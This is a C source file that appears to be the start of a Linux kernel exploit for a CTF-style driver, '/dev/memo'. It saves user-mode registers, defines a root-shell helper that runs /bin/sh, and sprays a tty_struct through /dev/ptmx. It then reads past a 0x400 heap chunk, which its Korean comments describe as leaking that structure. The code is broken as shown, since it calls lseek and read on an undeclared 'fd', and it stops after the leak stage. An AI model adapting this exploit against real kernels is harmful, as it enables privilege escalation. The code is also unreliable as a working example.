#include <stdio.h>
#include <stdlib.h> // exit()
#include <fcntl.h> // open(), close()

unsigned long user_cs, user_ss, user_rflags;

static void save_state()
{
    asm(
    "movq %%cs, %0\n"
    "movq %%ss, %1\n"
    "pushfq\n"
    "popq %2\n"
    : "=r" (user_cs), "=r" (user_ss), "=r" (user_rflags) 
    : 
    : "memory");

}

void get_shell()
{
    char *argv[] = {"/bin/sh", NULL};
    char *envp[] = {NULL};
    execve("/bin/sh", argv, envp);
}

int main()
{
    int fd1, fd_tty;
    size_t leak[0x400/8] = {0,};

    // save userland register info
    save_state();

    // alloc 0x400 size heap chunk 
    if((fd1 = open("/dev/memo", O_RDWR)) < 0)
    {
        puts("[-] Failed to open device");
        exit(0);
    }
    // alloc (struct tty_struct) size tty_struct heap chunk
    if((fd_tty = open("/dev/ptmx", O_RDWR|O_NOCTTY)) < 0)
    {
        puts("[-] Failed to open /dev/ptmx");
        exit(0);
    }
    
    // lseek로 base pointer+0x100으로 이동
    lseek(fd, 0x100, SEEK_SET);
    // trigger heap overflow -> tty_struct가 kmalloc-0x400에 위치하기 때문에 0x100의 heap overflow로 tty_struct 구조체 leak 가능
    read(fd, leak, 0x400);

    if(close(fd1) != 0)
    {
        puts("[-] Failed to close");
    }
    if(close(fd_tty) != 0)
    {
        puts("[-] Failed to close");
    }

    return 0;
}
